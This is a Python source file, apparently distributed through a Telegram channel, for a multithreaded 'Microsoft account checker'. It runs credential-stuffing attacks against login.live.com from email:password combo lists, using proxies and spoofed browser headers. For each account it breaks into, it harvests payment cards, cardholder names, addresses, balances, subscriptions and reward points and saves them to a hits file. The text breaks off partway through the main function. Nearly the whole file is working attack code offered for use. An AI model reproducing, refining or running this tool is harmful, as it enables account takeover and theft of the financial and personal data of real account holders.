"""
MICROSOFT ACCOUNT CHECKER - FULL CAPTURE        
                                                                                                                    
 📋 How it works:                                              
 1. Login to Microsoft account                                    
 2. Extract payment cards & balance                               
 3. Extract subscriptions (Xbox, Office 365, etc.)                
 4. Extract reward points                                         
 5. Save all data to file                                         
                                                                   
 💡 Example Result:                                                  
     email:pass | Country = US | Card = Visa ****1234 |               
     Balance = $50 | Subscriptions = [Xbox] | Points = 5000           
                                                                      
  Developer: @pyabrodie                                            
  📢 Channel: https://t.me/machitools                                 

"""

import requests
import re
import json
from urllib.parse import unquote, quote
import threading
import queue
import sys
import os
import random
import time
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION SETTINGS
# ═══════════════════════════════════════════════════════════════════════════

MAX_THREADS = 10                # Maximum number of concurrent threads
REQUEST_TIMEOUT = 15            # Request timeout in seconds
MAX_RETRIES = 100              # Maximum retry attempts per request

# Microsoft Login Constants (Required for authentication flow)
MICROSOFT_PPFT_TOKEN = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
MICROSOFT_BK = "1665024852"
MICROSOFT_UAID = "a5b22c26bc704002ac309462e8d061bb"

# ═══════════════════════════════════════════════════════════════════════════
# STATISTICS TRACKING
# ═══════════════════════════════════════════════════════════════════════════

stats = {
    "hits": 0,              # Successful logins
    "bad": 0,               # Invalid credentials
    "retries": 0,           # Total retry attempts
    "two_factor": 0,        # Accounts with 2FA enabled
    "unknown": 0,           # Unknown errors
    "checked": 0,           # Total accounts checked
    "total_combos": 0,      # Total combos loaded
    "proxy_errors": 0       # Proxy-related errors
}

stats_lock = threading.Lock()      # Thread-safe stats updates
output_lock = threading.Lock()     # Thread-safe file writing

# ═══════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def extract_between(source_text, left_str, right_str, var_name, variables, create_empty=True, prefix="", suffix=""):
    """
    Extract text between two delimiters from source text.
    
    Args:
        source_text: The text to search in
        left_str: Left delimiter
        right_str: Right delimiter
        var_name: Variable name to store result
        variables: Dictionary to store the extracted value
        create_empty: Create empty string if not found
        prefix: Prefix to add to extracted value
        suffix: Suffix to add to extracted value
    
    Returns:
        True if found, False otherwise
    """
    try:
        match = re.search(f"{re.escape(left_str)}(.*?){re.escape(right_str)}", source_text, re.DOTALL)
        if match:
            value = match.group(1)
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False


def extract_json_key(source_text, key, var_name, variables, create_empty=True, prefix="", suffix=""):
    """
    Extract a specific key from JSON text.
    
    Args:
        source_text: JSON text to parse
        key: Key to extract
        var_name: Variable name to store result
        variables: Dictionary to store the extracted value
        create_empty: Create empty string if not found
        prefix: Prefix to add to extracted value
        suffix: Suffix to add to extracted value
    
    Returns:
        True if found, False otherwise
    """
    try:
        data = json.loads(source_text)
        if key in data:
            value = data[key]
            variables[var_name] = f"{prefix}{value}{suffix}"
            return True
        else:
            if create_empty:
                variables[var_name] = ""
            return False
    except json.JSONDecodeError:
        if create_empty:
            variables[var_name] = ""
        return False
    except Exception:
        if create_empty:
            variables[var_name] = ""
        return False


def request_with_retry(session, method, url, step_name, retry_counter, **kwargs):
    """
    Make HTTP request with automatic retry on failure.
    
    Args:
        session: Requests session object
        method: HTTP method (GET, POST, etc.)
        url: Target URL
        step_name: Name of the step (for logging)
        retry_counter: List containing retry count [0]
        **kwargs: Additional arguments for request
    
    Returns:
        Response object or None on failure
    """
    for attempt in range(MAX_RETRIES + 1):
        try:
            response = session.request(method, url, timeout=REQUEST_TIMEOUT, **kwargs)
            return response
        except (requests.exceptions.ProxyError, requests.exceptions.SSLError) as e:
            if retry_counter:
                retry_counter[0] += 1
            raise
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES:
                if retry_counter:
                    retry_counter[0] += 1
                time.sleep(1 + attempt)
                continue
            else:
                raise
    return None


# ═══════════════════════════════════════════════════════════════════════════
# MAIN CHECKING FUNCTION
# ═══════════════════════════════════════════════════════════════════════════

def check_account(combo_line, proxy_config):
    """
    Check a Microsoft account and extract payment/subscription data.
    
    Args:
        combo_line: Email:password combo
        proxy_config: Proxy configuration dictionary
    
    Returns:
        Tuple: (status, hit_string, retry_count)
    """
    # Parse credentials
    email, password = combo_line.split(':', 1)
    
    variables = {'USER': email, 'PASS': password}
    captures = {}
    status = "UNKNOWN_INIT"
    retry_attempts = [0]

    # Create session with proxy if provided
    session = requests.Session()
    if proxy_config:
        session.proxies = proxy_config
    
    try:
        # ═══════════════════════════════════════════════════════════════════
        # STEP 1: LOGIN TO MICROSOFT ACCOUNT
        # ═══════════════════════════════════════════════════════════════════
        
        login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={quote(variables['USER'])}&contextid=2CCDB02DC526CA71&bk={MICROSOFT_BK}&uaid={MICROSOFT_UAID}&pid=15216"
        
        # Build login payload
        login_payload = "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>"
        login_payload = login_payload.replace("<USER>", variables['USER']) \
                                     .replace("<PASS>", variables['PASS']) \
                                     .replace("{ppft}", MICROSOFT_PPFT_TOKEN)

        # Login headers
        login_headers = {
            "Host": "login.live.com",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": "\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid={MICROSOFT_UAID}&display=touch&username={quote(variables['USER'])}",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": "CAW=%3CEncryptedData%20xmlns%3D%22http://www.w3.org/2001/04/xmlenc%23%22%20Id%3D%22BinaryDAToken1%22%20Type%3D%22http://www.w3.org/2001/04/xmlenc%23Element%22%3E%3CEncryptionMethod%20Algorithm%3D%22http://www.w3.org/2001/04/xmlenc%23tripledes-cbc%22%3E%3C/EncryptionMethod%3E%3Cds:KeyInfo%20xmlns:ds%3D%22http://www.w3.org/2000/09/xmldsig%23%22%3E%3Cds:KeyName%3Ehttp://Passport.NET/STS%3C/ds:KeyName%3E%3C/ds:KeyInfo%3E%3CCipherData%3E%3CCipherValue%3EM.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ%2BYNEFX7J4eX4arCa69y0j3ebxxB0ET0%2B8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on%2B9vOMIfZZIako5uD3VceGABh7ZxD%2BcwC0ksKgsXzQs9cJFZ%2BG1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA%3D%3D%3C/CipherValue%3E%3C/CipherData%3E%3C/EncryptedData%3E;DIDC=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;DIDCL=ct%3D1716398701%26hashalg%3DSHA256%26bver%3D35%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C537_BL2.0.D.Cj3b1fsY2Od2XaOlux/ytnFV4P9O69MsOlTuMxcP%252BKcIXlN4LPe7PoIP%252BHod6dialSv2/Hn5WivP0tHDuapNs99br8ndlpchQBiDEfuZDB816HK4qNq47xUrH8w/g77BxZnDfd3SPd7MoFLX4kGIm3LetDBJBqs1DruULzCK8RcdqWHgTudWf3Z5%252Bk1cIm2uEcMHHtw/Yh3Hkakhzec4M7H2WKKHLuSgLVf8imq8U23NWU19T/l8nh/zoWHkZUGqF5FkORhAnYRMr3YKJMcCuX4SdFRGlesuWd87QwIRwEyBOx6bKgGIdIf9cjIYju78CcDMay4JKudVx2NZltZLhH7qJwbyR9WMjrp32KijN/KsDwzR4kh5CkBelM4DPHuArCPgcbUQhE4yZz1b2BsZLR38EAm4fUhHOG8gFKKN3B1j6%252Bi9mmYX163DDWVEBhQLqzOD0dmCqZisPGpaGxZpUBJAGBLL1CpEsMuccqnq3UZlE08n4b1bD2b5os3gncshpg%253D%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DdOCSsum2b4e5E3zU3dM8YytFCYFx8DaH%26hash%3D7vtcbsk2TLGvJuTXm4JqCEVt2sgz9wxd3lSx61Dybnk%253D%26dd%3D1;MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89; OParams=11O.DlK9hYdFfivp*0QoJiYT2Qy83kFNo*ZZTQeuvQ0LQzYIADO3zbs*Hic1wfggJcJ6IjaSW0uhkJA2V2qHoF6Uijtl4S917NbRSYxGy0zbqEYtcXAlWZZCQUyVeRoEZT9xiChsk8JTXV2xPusIXRCRpyflM376GGcjUFMaQZuR6PPITnzwgJTeCj6iMAXKEyR5ougzXlltimdTufqAZLwLiC8a8U2ifLfQXP6ibI2Uk!8vBkegcZ73OpR2J2XPd0XeNEt7zVuUQnsbzmSKT3QetSepbGHhx*bkq8c0KyMZcq08dnJVvcPGwI2NNnN3hI1kytasvECwkKYbPIzVX*cA8jbyVqsQRoGWMTr7gGB4Z5BDteRuWO8tuVBRpn9spWtoBQv5CqOvPptW7kV0n1jrYxU$; MicrosoftApplicationsTelemetryDeviceId=49a10983-52d4-43ed-9a94-14ac360a5683; ai_session=K/6T8kGCWbit7HtaRqLso3|1716398680878|1716398680878; MSFPC=GUID=09547181a6984b52ad37278edb4b6ee6&HASH=0954&LV=202405&V=4&LU=1714868413949"
        }
        
        # Send login request
        login_response = request_with_retry(session, 'POST', login_url, "Login", retry_attempts, 
                                           headers=login_headers, data=login_payload, allow_redirects=True)
        
        if not login_response:
            return "NETWORK_ERROR_LOGIN", None, retry_attempts[0]
        
        response_text = login_response.text
        response_url = login_response.url

        # Check login result
        if "Your account or password is incorrect." in response_text or \
           "That Microsoft account doesn\\'t exist. Enter a different account" in response_text or \
           ("Sign in to your Microsoft account" in response_text and "oauth20_desktop.srf#access_token=" not in response_url and "oauth20_desktop.srf?" not in response_url):
            status = "BAD_CREDENTIALS"
        elif ",AC:null,urlFedConvertRename" in response_text:
            status = "BANNED_LOCKED"
        elif "timed out" in response_text.lower():
            status = "TIMEOUT"
        elif "account.live.com/recover" in response_text or \
             "account.live.com/identity/confirm" in response_text or \
             "Email/Confirm" in response_text:
            status = "TWO_FACTOR_REQUIRED"
        elif "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
            status = "ABUSE_LOCKED"
        else:
            # Check for success indicators
            success_cookies = any(cookie.name in ["ANON", "WLSSC"] for cookie in session.cookies)
            successful_redirect = "oauth20_desktop.srf#access_token=" in response_url or \
                                 "https://login.live.com/oauth20_desktop.srf?" in response_url
            
            if successful_redirect or success_cookies:
                status = "LOGIN_SUCCESS"
            elif login_response.status_code == 200 and "https://login.live.com/ppsecure/post.srf" in response_url and not success_cookies:
                status = "LOGIN_STUCK"
            else:
                status = "LOGIN_UNKNOWN"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR", None, retry_attempts[0]
    
    # Return if login failed
    if status != "LOGIN_SUCCESS":
        if status == "BAD_CREDENTIALS":
            return "BAD", None, retry_attempts[0]
        if status == "TWO_FACTOR_REQUIRED":
            return "2FA", None, retry_attempts[0]
        if status in ["BANNED_LOCKED", "ABUSE_LOCKED"]:
            return "BANNED", None, retry_attempts[0]
        return "UNKNOWN", None, retry_attempts[0]
    
    try:
        # ═══════════════════════════════════════════════════════════════════
        # STEP 2: GET OAUTH TOKEN
        # ═══════════════════════════════════════════════════════════════════
        
        oauth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
        
        oauth_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://account.microsoft.com/"
        }
        
        oauth_response = request_with_retry(session, 'GET', oauth_url, "OAuth", retry_attempts, 
                                           headers=oauth_headers, allow_redirects=True)
        
        if not oauth_response:
            return "NETWORK_ERROR_OAUTH", None, retry_attempts[0]

        # Extract access token from URL
        token_found = False
        if "access_token=" in oauth_response.url:
            if extract_between(oauth_response.url, "access_token=", "&token_type", "Token", variables):
                token_found = True
        
        if not token_found:
            return "TOKEN_ERROR", None, retry_attempts[0]
        
        if variables.get("Token"):
            variables["Token_decoded"] = unquote(variables["Token"])
        else:
            return "TOKEN_MISSING", None, retry_attempts[0]
    
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_OAUTH", None, retry_attempts[0]
    
    payment_status = "UNKNOWN"
    
    try:
        # ═══════════════════════════════════════════════════════════════════
        # STEP 3: GET PAYMENT INSTRUMENTS (CREDIT CARDS, BALANCE)
        # ═══════════════════════════════════════════════════════════════════
        
        if not variables.get("Token"):
            return "TOKEN_ERROR", None, retry_attempts[0]
        
        payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        
        payment_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f"MSADELEGATE1.0=\"{variables['Token']}\"",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }
        
        payment_response = request_with_retry(session, 'GET', payment_url, "Payment", retry_attempts, 
                                             headers=payment_headers)
        
        if not payment_response:
            return "NETWORK_ERROR_PAYMENT", None, retry_attempts[0]
        
        payment_data = payment_response.text
        
        if payment_response.status_code == 200:
            # Extract payment information
            extract_between(payment_data, 'balance":', ',"', "Balance", variables, prefix="$")
            extract_between(payment_data, 'paymentMethodFamily":"credit_card","display":{"name":"', '"', "CardInfo", variables)
            extract_between(payment_data, 'accountHolderName":"', '","', "CardHolder", variables)
            extract_between(payment_data, '"postal_code":"', '",', "Zipcode", variables)
            extract_between(payment_data, '"region":"', '",', "Region", variables)
            extract_between(payment_data, '"address_line1":"', '",', "Address", variables)
            extract_between(payment_data, '"city":"', '",', "City", variables)
            
            # Build address string
            captures["Address"] = f"[ Address: {variables.get('Address', 'N/A')}, City: {variables.get('City', 'N/A')}, State: {variables.get('Region', 'N/A')}, Postalcode: {variables.get('Zipcode', 'N/A')} ]"
            
            if not variables.get("CardInfo") and not variables.get("Balance"):
                payment_status = "SUCCESS_NO_PAYMENT_INFO"
            else:
                payment_status = "SUCCESS_PAYMENT_INFO"
        
        elif payment_response.status_code == 401:
            return "PAYMENT_UNAUTHORIZED", None, retry_attempts[0]
        else:
            return "PAYMENT_ERROR", None, retry_attempts[0]

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, retry_attempts[0]
    except requests.exceptions.RequestException:
        return "NETWORK_ERROR_PAYMENT", None, retry_attempts[0]
    
    transaction_status = "SKIPPED"
    
    if payment_status in ["SUCCESS_PAYMENT_INFO", "SUCCESS_NO_PAYMENT_INFO"]:
        try:
            # ═══════════════════════════════════════════════════════════════
            # STEP 4: GET TRANSACTIONS (SUBSCRIPTIONS, PURCHASES)
            # ═══════════════════════════════════════════════════════════════
            
            transaction_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
            transaction_headers = payment_headers
            
            transaction_response = request_with_retry(session, 'GET', transaction_url, "Transactions", 
                                                     retry_attempts, headers=transaction_headers)
            
            if not transaction_response:
                return "NETWORK_ERROR_TRANSACTIONS", None, retry_attempts[0]

            transaction_data = transaction_response.text
            
            if transaction_response.status_code == 200:
                # Extract transaction information
                extract_between(transaction_data, 'country":"', '"}', "Country", variables)
                extract_between(transaction_data, 'title":"', '",', "PurchasedItem", variables)
                extract_between(transaction_data, '"autoRenew":', ',', "AutoRenew", variables)
                extract_between(transaction_data, '"startDate":"', 'T', "StartDate", variables)
                extract_between(transaction_data, '"nextRenewalDate":"', 'T', "RenewalDate", variables)
                extract_between(transaction_data, 'description":"', '",', "Description", variables)
                extract_json_key(transaction_data, "quantity", "Quantity", variables)
                extract_json_key(transaction_data, "currency", "Currency", variables)
                
                # Format total amount
                temp = {}
                if extract_json_key(transaction_data, "totalAmount", "Amount", temp):
                    variables["AmountFormatted"] = f"{variables.get('Currency', '')} {temp['Amount']}"
                
                transaction_status = "SUCCESS_TRANSACTIONS"

            elif transaction_response.status_code == 401:
                return "TRANSACTION_UNAUTHORIZED", None, retry_attempts[0]
            else:
                return "TRANSACTION_ERROR", None, retry_attempts[0]
        
        except requests.exceptions.ProxyError:
            return "PROXY_ERROR", None, retry_attempts[0]
        except requests.exceptions.RequestException:
            return "NETWORK_ERROR_TRANSACTIONS", None, retry_attempts[0]
    
    try:
        # ═══════════════════════════════════════════════════════════════════
        # STEP 5: GET REWARD POINTS
        # ═══════════════════════════════════════════════════════════════════
        
        rewards_url = "https://rewards.bing.com/"
        rewards_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        
        rewards_response = request_with_retry(session, 'GET', rewards_url, "Rewards", retry_attempts, 
                                             headers=rewards_headers, allow_redirects=True)
        
        if rewards_response:
            rewards_data = rewards_response.text
            if extract_between(rewards_data, ',"availablePoints":', ',"', "RewardPoints", variables, create_empty=False):
                captures["points"] = variables["RewardPoints"]
            elif extract_between(rewards_data, 'pointsAvailable":', ',', "RewardPoints", variables, create_empty=False):
                captures["points"] = variables["RewardPoints"]
            else:
                captures["points"] = "N/A"
        else:
            captures["points"] = "N/A"

    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", None, retry_attempts[0]
    except requests.exceptions.RequestException:
        captures["points"] = "N/A"
    
    # ═══════════════════════════════════════════════════════════════════════
    # BUILD HIT STRING
    # ═══════════════════════════════════════════════════════════════════════
    
    if payment_status.startswith("SUCCESS") or transaction_status.startswith("SUCCESS"):
        country = variables.get("Country", "N/A")
        card_holder = variables.get("CardHolder", "")
        card_holder_str = card_holder if card_holder and card_holder != "N/A" else "No CC Linked"
        
        balance = variables.get("Balance", "N/A")
        purchased_item = variables.get("PurchasedItem", "N/A")
        purchased_items_str = f"[{purchased_item}]" if purchased_item != "N/A" else "[N/A]"
        
        auto_renew = variables.get("AutoRenew", "N/A").lower()
        auto_renew_str = "Yes" if auto_renew == "true" else ("No" if auto_renew == "false" else "N/A")
        
        start_date = variables.get("StartDate", "N/A")
        renewal_date = variables.get("RenewalDate", "N/A")
        points = captures.get("points", "N/A")
        
        hit_string = (
            f"{combo_line} | Country = {country} | CardHolder = {card_holder_str} | "
            f"CC Funding = {balance} | Purchased Items = {purchased_items_str} | "
            f"Auto Renew = {auto_renew_str} | Start in = {start_date} | End in = {renewal_date} | "
            f"By = @pyabrodie"
        )
        
        return "HIT", hit_string, retry_attempts[0]
    else:
        return "NO_DATA", None, retry_attempts[0]


# ═══════════════════════════════════════════════════════════════════════════
# DISPLAY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def display_stats_table():
    """Display statistics in a centered table format."""
    with stats_lock:
        # Clear screen (optional)
        # os.system('cls' if os.name == 'nt' else 'clear')
        
        # Calculate progress percentage
        progress = 0
        if stats['total_combos'] > 0:
            progress = (stats['checked'] / stats['total_combos']) * 100
        
        # Build table
        table = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                      MICROSOFT CHECKER STATUS                        ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  Progress: {stats['checked']}/{stats['total_combos']} ({progress:.1f}%)                                   ║
║                                                                      ║
╠═══════════════════════════╦══════════════════════════════════════════╣
║                           ║                                          ║
║  ✅ HITS                  ║  {stats['hits']:<40} ║
║  ❌ BAD                   ║  {stats['bad']:<40} ║
║  🔐 2FA                   ║  {stats['two_factor']:<40} ║
║  ❓ UNKNOWN               ║  {stats['unknown']:<40} ║
║  🔄 RETRIES               ║  {stats['retries']:<40} ║
║                           ║                                          ║
╚═══════════════════════════╩══════════════════════════════════════════╝
        """
        
        # Clear previous output and display table
        sys.stdout.write('\r' + ' ' * 100 + '\r')  # Clear line
        print(table)


# ═══════════════════════════════════════════════════════════════════════════
# WORKER THREAD
# ═══════════════════════════════════════════════════════════════════════════

def worker(combo_queue, proxy_list):
    """
    Worker thread that processes combos from the queue.
    
    Args:
        combo_queue: Queue containing combos to check
        proxy_list: List of proxies to use
    """
    while True:
        try:
            combo = combo_queue.get_nowait()
        except queue.Empty:
            break

        # Select random proxy if available
        proxy_config = None
        if proxy_list:
            proxy_url = random.choice(proxy_list)
            proxy_config = {'http': proxy_url, 'https': proxy_url}

        # Check account
        status, hit_data, retries = check_account(combo, proxy_config)
        
        # Update statistics
        with stats_lock:
            stats['checked'] += 1
            stats['retries'] += retries

            if status == "HIT":
                stats['hits'] += 1
                # Save hit to file
                if hit_data:
                    with output_lock:
                        os.makedirs("results", exist_ok=True)
                        with open("results/Microsoft-Hits.txt", "a", encoding="utf-8") as f:
                            f.write(hit_data + "\n")
            
            elif status == "BAD":
                stats['bad'] += 1
            
            elif status == "2FA":
                stats['two_factor'] += 1
            
            elif status == "PROXY_ERROR":
                stats['proxy_errors'] += 1
                stats['unknown'] += 1
            
            else:
                stats['unknown'] += 1

        # Update display
        display_stats_table()
        combo_queue.task_done()


# ═══════════════════════════════════════════════════════════════════════════
# PROXY LOADER
# ═══════════════════════════════════════════════════════════════════════════

def load_proxies():
    """
    Load proxies from file with format detection.
    
    Returns:
        List of formatted proxy URLs
    """
    proxies = []
    proxy_file = input(f"{Style.BRIGHT} [+] Proxy File (Enter 1 for none): {Style.RESET_ALL}").strip()
    
    if proxy_file == "1":
        proxy_file = None

    if proxy_file:
        if not os.path.exists(proxy_file):
            print(f"{Fore.RED} [-] Proxy file not found.{Style.RESET_ALL}")
            return []
        
        try:
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                raw_lines = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Fore.RED} [-] Error reading proxy file: {e}{Style.RESET_ALL}")
            return []
        
        if not raw_lines:
            print(f"{Fore.YELLOW} [!] Proxy file is empty.{Style.RESET_ALL}")
            return []
        
        # Check if first proxy has scheme
        first_has_scheme = re.match(r'^(http|https|socks4|socks5)://', raw_lines[0], re.IGNORECASE)
        chosen_scheme = None
        
        if not first_has_scheme:
            while True:
                ptype = input(f"{Style.BRIGHT} [+] Proxy type (http, socks4, socks5): {Style.RESET_ALL}").lower()
                if ptype in ['http', 'socks4', 'socks5']:
                    chosen_scheme = ptype
                    break
                elif ptype == 'https':
                    chosen_scheme = 'http'
                    break
                else:
                    print(f"{Fore.RED} [-] Invalid proxy type.{Style.RESET_ALL}")
        
        # Parse and format proxies
        for line in raw_lines:
            scheme = chosen_scheme
            address = line
            
            # Extract scheme if present
            scheme_match = re.match(r'^(http|https|socks4|socks5)://(.*)', line, re.IGNORECASE)
            if scheme_match:
                scheme = scheme_match.group(1).lower()
                address = scheme_match.group(2)
            
            if not scheme:
                continue

            # Handle authentication
            auth_part = ""
            host_port = address
            
            if "@" in address:
                possible_auth, possible_host_port = address.split('@', 1)
                if ':' in possible_host_port:
                    auth = possible_auth
                    host_port = possible_host_port
                    if ":" in auth:
                        user, passwd = auth.split(":", 1)
                        auth_part = f"{quote(user)}:{quote(passwd)}@"
                    else:
                        auth_part = f"{quote(auth)}@"
            
            proxies.append(f"{scheme}://{auth_part}{host_port}")
        
        if proxies:
            print(f"{Fore.GREEN} [+] Loaded {len(proxies)} proxies.{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW} [i] No proxies specified.{Style.RESET_ALL}")
    
    return proxies


# ═══════════════════════════════════════════════════════════════════════════
# MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Main entry point."""
    
    # Display banner
    print(f"""{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
